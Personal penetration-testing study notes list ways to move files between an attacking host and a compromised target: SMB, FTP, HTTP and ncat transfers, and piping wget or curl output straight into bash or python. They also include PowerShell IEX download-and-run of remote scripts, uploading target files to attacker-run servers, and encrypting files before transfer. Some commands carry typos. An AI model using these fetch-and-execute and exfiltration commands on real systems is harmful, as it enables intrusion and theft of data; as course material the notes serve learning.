   

File Transfer

Method 1

1. md5sum [file]

- Calculate the 128 bit MD5 checksum

2. cat [file] | base4 -w 0;echo

- Display and converts the file into base64

3. [IO.File]::WriteAllBytes("[directory where file being stored. EX. C:\Users\Public[file]]"), [Convert]::FromBase64String("[base64string]")

- cmd is writing a new file and putting the location. The file is an exact copy based on the base64string.

4. Get-FileHash C:\Users\Public[file] -Algorithm md5

- Retrieves the file md5 hash and use that to compare to the original to confirm validity  
    NOTE: ![f3b2cd525381bdf6b2d0d161a3a3b484.png](9758ad50582641de8f1edf1d8e8b9e82.png)

---

Method 2 SMB Server Transfer

1. sudo impacket-smbserver [sharename. EX. home] -smb2support [share directory. EX. /home]

- Creates a SMB server on port 445 to share files based on the directory you're sharing

2. copy \[IP]\ [directory path. file name] EX. copy \10.128.10.200\home\hello.txt

- Copy the file based on the IP and directory path  
    NOTE: Newer version of Windows block unauthenticated guest access. To bypass

1. sudo impacket-smbserver [sharename] -smb2support [share directory] -user [make one up.EX test] -password [make one up. EX hello]
2. net use n: \[IP] [directory] /user: test hello

---

Method 3 FTP Server Transfer

1. sudo pip3 install pyftpdlib

- Download the necessary python3 module.

2. sudo python3 -m pyftpdlib --port 21

- By default pyftpdlib uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password

3. (New-Object Net.WebClient).DownloadFile('ftp://[IP] / [file]', 'C:\Users\Public\file')

- Go on the Remote PC and launch PS to transfer the file  
    OPTIONAL: ![dd2a6c077e32874f8880adf14d28d057.png](0c657aa9b6544afea8499ef8843d64b1.png)
- Create a command file and execute the commands all at once.
- Useful if the remote shell is non-interactive

---

Method 4 Web-based Downloads

1. wget [URL/filename] -O /home/filename

- O option set the output  
    OPTIONAL: pipe the command to execute the file rather then download then execute
- | [method. EX. bash, python3]
- wget -q0- [URL/filename.py] | python3

---

Method 5 Web-based Download

1. curl -o [output] [URL/filename]  
    OPTIONAL: pipe the cmd to execute the file rather than download then execute

- | bash

---

Method 6 SCP

1. sudo systemctl enable ssh

- Enable ssh server

2. sudo systemctl start ssh

- Starting the ssh server

3. netstat -lnpt

- Checking for SSH listening port

4. scp[username]@[IP]:/[directory/file] .

- Download the file via SCP

---

Method 7 Download w/ Bash via Webserver  
1.exec 3<>/dev/tcp/[IP/80]

- Connect to the Target Webserver

2. echo -e "GET /file.sh HTTP/1.1\n\n">&3

- Send a HTTP GET request

3. cat <&3

- Print the Response

---

Method 8 -Create a Web Server

1. python3 -m http.server
    
2. python2.7 -m SimpleHTTPServer
    
3. php -S 0.0.0.0:8000
    
4. ruby -run -ehttpd . -p8000
    
5. wget [IP:8000] / [file]
    

Upload Operations

- Uploading files to your attacking host from your target machine

Method 1:

1. [Convert]::ToBase64String((Get-Content -path "C:[path of file]"))

- In PS on the target machine retrieve the base64 string of the file

2. Get-FileHash "C[path of file]" -Algorithm MD5 | select Hash

- Get the MD5 Hash of the file

3. echo [base64string] | base64 -d > [file name]

- In the Attacker machine create a file using the base64string and file name

4. md5sum [file]

- Verify the validity of the file with the hashes

Method 2: PS script to upload file to Python Upload Server  
1.IEX(New-Object Net.WebClient).DownloadString('[https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1](https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1 "https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1")')

- Download the script needed to perform the action

2. Invoke-FileUpload -Uri http://[target IP:8000/home] -File C:\Users\Public[file]

- Upload the file to target and display the hash

Method 3  
![f4d4a735ba49cfe4c8cde77cfb72fb32.png](8f7faa645411400ca3d4e6b909d80a4c.png)  
![3b52d82d57731abef10abdfc8bbc44d7.png](bacb47319ba84bdc9fa1bab287388a8e.png)

Method 4

1. sudo python3 -m pip install --user uploadserver

- installs the uploadserver module

2. OPTIONAL: openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

- Create a self-signed Certificate

3. mkdir https && cd https

- Creates a new directory to host the file for the webserver

4. sudo python3 -m uploadserver 443  
    OPTIONAL: sudo python3 -m uploadserver 443 --server-certificate /root/server.pem

- Start up the server on port 443 with the certificate

5. curl -X POST [https://10.10.15.240/upload](https://10.10.15.240/upload "https://10.10.15.240/upload") -F 'files=@/home/hello.txt' --insecure

---

Download Files From Online

Method 1 - Python

- python2.7 -c  
    [Recording 2024-03-11 163237.mp4](../_resources/86b9212b5a464ae79911c885fefaa599.mp4 "../_resources/86b9212b5a464ae79911c885fefaa599.mp4")  
    -python3 -c  
    Same syntax

Method 2 - PHP  
`- php -r '$file = file_get_contents("[URL]"); file_put_contents("[file]",$file);''`

Method 3 - Ruby

- ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("[https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")")))'

RDP file Tranfer

1. xfreerdp /v: [IP] /u: [user] /drive:linux,/home  
    Create the RDP session with the addition of creating a share folder within tsclient/linux

Ncat file transfer

1. ncat -l -p 8000 --recv-only > [file]  
    On the compromised machine set up ncat to listen on port 8000 for this particular file
2. nc --send-only [IP] 8000 < [file]

File Encryption on Linux

1. openssl enc -aes256 -iter 100000 -pbkdf2 -in [filepath/file] -out [file]

- Encrypt a file ready for transfer

2. openssl enc -d -aes256 -iter 100000 -pbkdf2 -in [filepath/file] -out [file]

File Encryption on Windows

1. Transfer Script using any of the above methods
2. Import-Module .\Invoke-AESEncryption.ps1
3. Invoke-AESEncryption -Mode Encrypt -Key "[password]" -Path .[filepath]